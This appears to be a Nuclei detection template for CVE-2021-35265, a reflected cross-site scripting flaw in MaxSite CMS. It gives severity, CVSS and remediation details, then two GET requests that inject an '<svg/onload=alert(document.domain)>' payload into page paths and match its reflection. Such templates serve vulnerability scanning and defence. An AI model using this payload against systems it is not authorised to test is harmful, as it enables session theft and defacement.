id: CVE-2021-35265

info:
  name: MaxSite CMS > V106 - Cross-Site Scripting
  author: pikpikcu
  severity: medium
  description: |
    A reflected cross-site scripting vulnerability in MaxSite CMS before V106 via product/page/* allows remote attackers to inject arbitrary web script to a page."
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Upgrade to a patched version of MaxSite CMS or apply the vendor-provided security patch to mitigate the XSS vulnerability (CVE-2021-35265).
  reference:
    - https://github.com/maxsite/cms/issues/414#issue-726249183
    - https://nvd.nist.gov/vuln/detail/CVE-2021-35265
    - https://github.com/maxsite/cms/commit/6b0ab1de9f3d471485d1347e800a9ce43fedbf1a
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-35265
    cwe-id: CWE-79
    epss-score: 0.00127
    epss-percentile: 0.47114
    cpe: cpe:2.3:a:maxsite:maxsite_cms:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: maxsite
    product: maxsite_cms
    shodan-query: html:'content="MaxSite CMS'
  tags: cve2021,cve,maxsite,xss

http:
  - method: GET
    path:
      - '{{BaseURL}}/page/hello/1%22%3E%3Csvg/onload=alert(document.domain)%3E'
      - '{{BaseURL}}/page/1%22%3E%3Csvg/onload=alert(document.domain)%3E'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '><svg/onload=alert(document.domain)>'

      - type: word
        part: body
        words:
          - 'mso-comments-rss">RSS</a>'
          - 'MaxSite CMS'
          - 'feed"><span>RSS</span>'
        condition: or

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100887e0665278f85792a99c30edb84adafdd0e290a73a5b9682de72abba1d7c723022100ad61f9fb19198c8188c377500882fec59dc402446d52b1cf09dc26aa5f52570a:922c64590222798bb761d5b6d8e72950